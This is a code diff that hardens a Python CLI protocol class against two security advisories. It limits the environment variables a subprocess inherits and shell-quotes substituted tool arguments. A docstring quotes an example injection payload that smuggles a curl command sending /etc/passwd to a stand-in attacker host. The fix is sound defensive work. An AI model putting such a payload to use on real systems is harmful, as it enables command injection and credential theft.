@@ -61,22 +61,89 @@ class CliCommunicationProtocol(CommunicationProtocol):
         """Log error messages."""
         logger.error(f"[CliCommunicationProtocol Error] {message}")
     
+    # Default set of host environment variables propagated to the CLI
+    # subprocess when `CliCallTemplate.inherit_env_vars` is not provided
+    # (i.e. None). Locating binaries (`PATH` / `PATHEXT`), basic shell +
+    # locale state, and Windows runtime paths are needed for almost any
+    # tool to start. Anything else (cloud creds, API keys, internal
+    # tokens) must be opted in by listing the variable name explicitly in
+    # `inherit_env_vars`, or its value provided in `env_vars`.
+    #
+    # If `inherit_env_vars == []`, the caller is opting into strict mode
+    # and NOTHING is inherited from the host — only `env_vars` reaches the
+    # subprocess.
+    #
+    # Backs GHSA-5v57-8rxj-3p2r: the previous implementation handed
+    # `os.environ.copy()` to the subprocess, which combined with the
+    # command injection in `_substitute_utcp_args`
+    # (GHSA-33p6-5jxp-p3x4) let an attacker exfiltrate every secret in
+    # the host process.
+    _DEFAULT_INHERITED_KEYS_UNIX: tuple = (
+        "PATH", "HOME", "LANG", "LC_ALL", "LC_CTYPE", "USER", "LOGNAME",
+        "SHELL", "TZ", "TERM",
+    )
+    _DEFAULT_INHERITED_KEYS_WINDOWS: tuple = (
+        "PATH", "PATHEXT", "SYSTEMROOT", "SYSTEMDRIVE", "WINDIR", "COMSPEC",
+        "TEMP", "TMP", "USERPROFILE", "USERNAME", "USERDOMAIN", "COMPUTERNAME",
+        "HOMEDRIVE", "HOMEPATH", "APPDATA", "LOCALAPPDATA", "PROGRAMDATA",
+        "PROGRAMFILES", "PROGRAMFILES(X86)", "PROGRAMW6432", "OS",
+        "PROCESSOR_ARCHITECTURE", "NUMBER_OF_PROCESSORS",
+    )
+
+    @classmethod
+    def _default_inherited_keys(cls) -> tuple:
+        """Return the platform-appropriate default inheritance list."""
+        if os.name == 'nt':
+            return cls._DEFAULT_INHERITED_KEYS_WINDOWS
+        return cls._DEFAULT_INHERITED_KEYS_UNIX
+
     def _prepare_environment(self, provider: CliCallTemplate) -> Dict[str, str]:
         """Prepare environment variables for command execution.
-        
+
+        Composes the subprocess environment with one layer of host
+        inheritance (controlled by `provider.inherit_env_vars`) plus
+        `provider.env_vars` on top:
+
+          - `inherit_env_vars is None` (default): pass through the
+            built-in default allowlist of host vars (PATH, HOME / PATHEXT,
+            SYSTEMROOT, etc.) so normal shells and binaries work without
+            extra wiring.
+          - `inherit_env_vars == []`: strict mode. Nothing from the host
+            environment reaches the subprocess — only `env_vars`.
+          - `inherit_env_vars == [...]`: pass through exactly the named
+            host variables. The default allowlist is NOT merged in, so
+            callers who still want PATH must include it explicitly.
+
+        `env_vars` is always applied last and overrides anything inherited
+        from the host.
+
+        This prevents the unrestricted host environment from leaking into
+        a subprocess that may be running attacker-controlled commands
+        (GHSA-5v57-8rxj-3p2r).
+
         Args:
             provider: The CLI provider
-            
+
         Returns:
             Environment variables dictionary
         """
-        import os
-        env = os.environ.copy()
-        
-        # Add custom environment variables if provided
+        if provider.inherit_env_vars is None:
+            inherited_keys: tuple = self._default_inherited_keys()
+        else:
+            inherited_keys = tuple(provider.inherit_env_vars)
+
+        env: Dict[str, str] = {}
+        for key in inherited_keys:
+            value = os.environ.get(key)
+            if value is not None:
+                env[key] = value
+
+        # Caller-supplied variables override anything inherited from the
+        # host. Unset host vars in `inherited_keys` are skipped silently
+        # so missing optionals don't break tool execution.
         if provider.env_vars:
             env.update(provider.env_vars)
-        
+
         return env
     
     async def _execute_command(
@@ -255,27 +322,55 @@ class CliCommunicationProtocol(CommunicationProtocol):
                 f"Deregistering CLI manual '{manual_call_template.name}' (no-op)"
             )
     
+    @staticmethod
+    def _shell_quote(value: str) -> str:
+        """Quote a single value so it is interpreted as one literal token by
+        the target shell (`bash` on Unix, `powershell.exe` on Windows).
+
+        On Unix we delegate to `shlex.quote`. On Windows we wrap the value in
+        a PowerShell single-quoted literal: inside such a literal everything
+        is taken verbatim except `'` itself, which is escaped by doubling
+        (`''`). This blocks the metacharacters PowerShell would otherwise
+        interpret (`;`, `&`, `|`, `` ` ``, `$`, `(`, `)`, `<`, `>`, line
+        breaks).
+
+        Backs GHSA-33p6-5jxp-p3x4: the previous substitution did
+        `str(tool_args[arg_name])` directly into the shell script, which
+        allowed arbitrary command injection (e.g.
+        `"data.csv; curl http://attacker.example/$(cat /etc/passwd)"`).
+        """
+        if os.name == 'nt':
+            return "'" + value.replace("'", "''") + "'"
+        return shlex.quote(value)
+
     def _substitute_utcp_args(self, command: str, tool_args: Dict[str, Any]) -> str:
         """Substitute UTCP_ARG placeholders in command string with tool arguments.
-        
+
+        Each substituted value is shell-quoted for the target shell so that
+        attacker-controlled `tool_args` cannot escape the placeholder and
+        inject extra commands. As a side effect, a placeholder always
+        expands to exactly one shell token: callers that need to pass
+        multiple flags / arguments must use multiple placeholders rather
+        than splitting a single string at runtime.
+
         Args:
             command: Command string containing UTCP_ARG_argname_UTCP_END placeholders
             tool_args: Dictionary of argument names and values
-            
+
         Returns:
-            Command string with placeholders replaced by actual values
+            Command string with placeholders replaced by shell-quoted values
         """
         # Pattern to match UTCP_ARG_argname_UTCP_END
         pattern = r'UTCP_ARG_(.+?)_UTCP_END'
-        
+
         def replace_placeholder(match):
             arg_name = match.group(1)
             if arg_name in tool_args:
-                return str(tool_args[arg_name])
+                return self._shell_quote(str(tool_args[arg_name]))
             else:
                 self._log_error(f"Missing argument '{arg_name}' for placeholder in command: {command}")
-                return f"MISSING_ARG_{arg_name}"
-        
+                return self._shell_quote(f"MISSING_ARG_{arg_name}")
+
         return re.sub(pattern, replace_placeholder, command)
     
     def _build_combined_shell_script(self, commands: List[CommandStep], tool_args: Dict[str, Any]) -> str:
